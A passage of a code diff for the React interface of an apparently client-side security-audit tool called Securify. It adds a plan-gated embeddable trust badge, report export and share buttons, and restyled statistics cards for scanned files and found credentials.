+                      locked feature: requires Pro / Agency plan
+                    </div>
+                    <button
+                      onClick={() => onPurchaseTrigger?.('pro', 'Pro', 'monthly')}
+                      className="bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-xs font-mono font-medium rounded-xl px-5 py-3.5 lowercase transition-all select-none w-full sm:w-auto"
+                    >
+                      unlock signed reports
+                    </button>
+                  </div>
+                )}
+              </div>
+
+              {/* Trust Badge */}
+              <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 flex flex-col justify-between items-start space-y-4">
+                <div className="space-y-1.5 text-left w-full">
+                  <span className="inline-flex items-center gap-1.5 text-[9px] font-mono text-neutral-500 uppercase">
+                    conversion optimization
+                  </span>
+                  <h4 className="text-sm font-semibold text-white lowercase">embed public security badge</h4>
+                  <p className="text-neutral-400 text-xs font-light lowercase leading-relaxed">
+                    embed a dynamic security badge on your checkout or sign-up pages to prove you are audited by Securify. boosts customer trust and landing page conversion rates.
+                  </p>
+                </div>
+                
+                {/* Badge Preview */}
+                <div className="w-full flex items-center justify-center py-4 bg-black/40 border border-white/5 rounded-2xl relative overflow-hidden group">
+                  <div className="absolute inset-0 bg-gradient-to-r from-emerald-500/5 to-sky-500/5 opacity-50 pointer-events-none" />
+                  
+                  {/* Glassmorphic Badge */}
+                  <div className="relative z-10 bg-neutral-950/80 border border-white/10 rounded-2xl px-4 py-2.5 flex items-center gap-3 backdrop-blur-md shadow-lg shadow-black/50 select-none">
+                    <div className="w-6 h-6 bg-emerald-950/50 border border-emerald-500/30 rounded-lg flex items-center justify-center shrink-0">
+                      <svg className="w-3.5 h-3.5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                      </svg>
+                    </div>
+                    <div className="text-left font-mono">
+                      <span className="block text-[8px] text-neutral-500 lowercase leading-none">secured by</span>
+                      <span className="block text-xs font-semibold text-white leading-tight">Securify Verified</span>
+                    </div>
+                    <div className="bg-emerald-950 border border-emerald-500/30 text-emerald-400 font-mono text-[9px] font-bold px-2 py-0.5 rounded">
+                      {siteScanResults.grade}
+                    </div>
+                  </div>
+                </div>
+                
+                {premiumStatus?.valid && (premiumStatus.plan === 'Pro' || premiumStatus.plan === 'Agency') ? (
+                  <div className="space-y-2 w-full text-left font-mono">
+                    <label className="text-[9px] text-neutral-500 block">copy embed HTML code:</label>
+                    <div className="relative">
+                      <input
+                        type="text"
+                        readOnly
+                        value={`<a href="https://securify.gucluyumhe.dev" target="_blank"><img src="https://securify.gucluyumhe.dev/badge.svg?domain=${siteScanResults.domain}&grade=${siteScanResults.grade}" alt="Securify Security Status" /></a>`}
+                        className="w-full bg-neutral-950 border border-white/10 rounded-xl px-3 py-2.5 text-[9px] text-neutral-400 select-all pr-12 focus:outline-none"
+                      />
+                      <button
+                        onClick={async () => {
+                          const embed = `<a href="https://securify.gucluyumhe.dev" target="_blank"><img src="https://securify.gucluyumhe.dev/badge.svg?domain=${siteScanResults.domain}&grade=${siteScanResults.grade}" alt="Securify Security Status" /></a>`;
+                          await navigator.clipboard.writeText(embed);
+                          setBadgeCopied(true);
+                          setTimeout(() => setBadgeCopied(false), 2000);
+                        }}
+                        className="absolute right-2 top-2 bg-neutral-900 border border-white/5 text-[9px] px-2 py-1 rounded text-white"
+                      >
+                        {badgeCopied ? 'copied!' : 'copy'}
+                      </button>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="space-y-3 w-full">
+                    <div className="flex items-center gap-2 text-[10px] text-amber-500 font-mono">
+                      <svg className="w-4 h-4 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                      </svg>
+                      locked feature: requires Pro / Agency plan
+                    </div>
+                    <button
+                      onClick={() => onPurchaseTrigger?.('pro', 'Pro', 'monthly')}
+                      className="bg-neutral-900 hover:bg-neutral-800 text-white border border-white/10 text-xs font-mono font-medium rounded-xl px-5 py-3.5 lowercase transition-all select-none w-full sm:w-auto"
+                    >
+                      unlock trust badge
+                    </button>
+                  </div>
+                )}
+              </div>
+
+            </div>
+          </div>
+        )}
+
         {/* Rich Scanning Report Card */}
         {customScanResults && (
           <div className="bg-neutral-900/40 border border-white/5 backdrop-blur-sm rounded-3xl p-6 mb-8 space-y-6 print:border-neutral-300 print:text-black">
             
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/5 pb-4">
+              <div className="space-y-1">
+                <span className="text-[10px] font-mono text-neutral-500 uppercase">security audit report</span>
+                <h3 className="text-base font-semibold text-white lowercase">
+                  {customScanResults.folderName.includes('/') ? 'github repository' : 'local workspace'}: {customScanResults.folderName}
+                </h3>
+              </div>
+              
+              {/* Toolbar Actions */}
+              <div className="flex flex-wrap gap-2">
+                <button
+                  onClick={exportReportMarkdown}
+                  className="bg-emerald-950/60 hover:bg-emerald-900/60 text-emerald-400 border border-emerald-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  export (.md)
+                </button>
+                <button
+                  onClick={exportReportJSON}
+                  className="bg-sky-950/60 hover:bg-sky-900/60 text-sky-400 border border-sky-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  export (.json)
+                </button>
+                <button
+                  onClick={shareAuditReport}
+                  className="bg-indigo-950/60 hover:bg-indigo-900/60 text-indigo-400 border border-indigo-500/20 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  {reportShared ? 'copied!' : 'share'}
+                </button>
+                <button
+                  onClick={handleReset}
+                  className="bg-neutral-950 hover:bg-neutral-900 text-neutral-400 border border-white/5 hover:border-white/10 text-[10px] font-mono rounded-xl px-3 py-2 lowercase transition-all select-none"
+                >
+                  clear
+                </button>
+              </div>
+            </div>
+
             {/* Wave 7 Sub-tabs (Only for GitHub tab scans) */}
             {scanTab === 'github' && (
               <div className="flex border-b border-white/5 select-none -mx-6 px-6 pb-4 mb-2 overflow-x-auto scrollbar-none gap-2">
@@ -2363,32 +3393,32 @@ audit performed client-side using Securify Interactive Portal.
 
         {/* Global Stats Grid */}
         <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8 select-text print:grid-cols-3 print:gap-4 print:mb-6">
-          <div className="bg-neutral-950 border border-white/5 p-6 rounded-2xl print:bg-white print:border-neutral-300 print:text-black">
+          <GlowCard className="print:bg-white print:border-neutral-300 print:text-black">
             <span className="block text-[10px] font-mono text-neutral-500 mb-1 lowercase print:text-neutral-500">
               {customScanResults ? "total files analyzed" : "total files scanned"}
             </span>
             <span className="block text-2xl md:text-3xl font-semibold tracking-tight text-white font-mono print:text-black print:text-xl">
               {stats.totalScanned.toLocaleString()}
             </span>
-          </div>
+          </GlowCard>
 
-          <div className="bg-neutral-950 border border-white/5 p-6 rounded-2xl print:bg-white print:border-neutral-300 print:text-black">
+          <GlowCard className="print:bg-white print:border-neutral-300 print:text-black">
             <span className="block text-[10px] font-mono text-neutral-500 mb-1 lowercase print:text-neutral-500">
               {customScanResults ? "found credentials" : "blocked credential leaks"}
             </span>
             <span className="block text-2xl md:text-3xl font-semibold tracking-tight text-red-500 font-mono print:text-red-600 print:text-xl">
               {stats.blockedLeaks.toLocaleString()}
             </span>
-          </div>
+          </GlowCard>
 
-          <div className="bg-neutral-950 border border-white/5 p-6 rounded-2xl print:bg-white print:border-neutral-300 print:text-black">
+          <GlowCard className="print:bg-white print:border-neutral-300 print:text-black">
             <span className="block text-[10px] font-mono text-neutral-500 mb-1 lowercase print:text-neutral-500">
               {customScanResults ? "scan duration" : "active local git hooks"}
             </span>
             <span className="block text-2xl md:text-3xl font-semibold tracking-tight text-neutral-300 font-mono print:text-black print:text-xl">
               {customScanResults ? `${customScanResults.durationMs}ms` : stats.activeHooks.toLocaleString()}
             </span>
-          </div>
+          </GlowCard>
         </div>
 
         {/* Multi-Column Layout: Visual Map & Compliance (Left) vs Log Output (Right) */}
